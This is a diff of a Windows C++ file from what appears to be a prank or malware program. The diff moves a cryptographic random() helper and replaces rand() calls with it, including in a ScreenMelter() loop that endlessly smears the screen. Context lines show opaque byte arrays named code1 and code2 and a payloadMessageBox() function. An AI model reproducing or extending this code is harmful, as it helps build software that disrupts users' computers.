@@ -23,7 +23,7 @@
 
 #pragma once
 
-#define random_in(a,b) (rand()%(b-a)+a) 
+#define random_in(a,b) (random()%(b-a)+a) 
 #define DESKTOP_WINDOW ((HWND)0)
 #define PI 3.1415926
 
@@ -274,6 +274,15 @@ const unsigned char code2[] = {
 
 const size_t code1_len = sizeof(code1);
 const size_t code2_len = sizeof(code2);
+int random() {
+    if (prov == '\0')
+        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
+            ExitProcess(1);
+
+    int out;
+    CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
+    return out & 0x7fffffff;
+}
 
 void disable_redraw(){
     SendMessage(hwnd, WM_SETREDRAW, FALSE, 0L);
@@ -479,7 +488,7 @@ string rand_str(const int len)  /*参数为字符串的长度*/
     for(idx = 0;idx < len;idx ++)
     {
         /*rand()%26是取余，余数为0~25加上'a',就是字母a~z,详见asc码表*/
-        c = 'a' + rand()%26;
+        c = 'a' + random()%26;
         str.push_back(c);       /*push_back()是string类尾插函数。这里插入随机字符c*/
     }
     return str;                 /*返回生成的随机字符串*/
@@ -612,7 +621,7 @@ void ScreenMelter(){
     while(1){
         HDC screenDC = GetDC(NULL);
         x = rand() % scrWidth;
-        BitBlt(screenDC, x, 1, 10, scrHeight, screenDC, x, 0, SRCCOPY);
+        BitBlt(screenDC, x, 1, random_in(0,128), scrHeight, screenDC, x, 0, SRCCOPY); // Random_in是大小
         Sleep(2);
     }
 }
@@ -688,16 +697,6 @@ void randomSeed(){
         srand((int)time(0));
         Sleep(300);
     }
-}
-
-int random() {
-    if (prov == '\0')
-        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
-            ExitProcess(1);
-
-    int out;
-    CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
-    return out & 0x7fffffff;
 }
 
 int payloadMessageBox() {
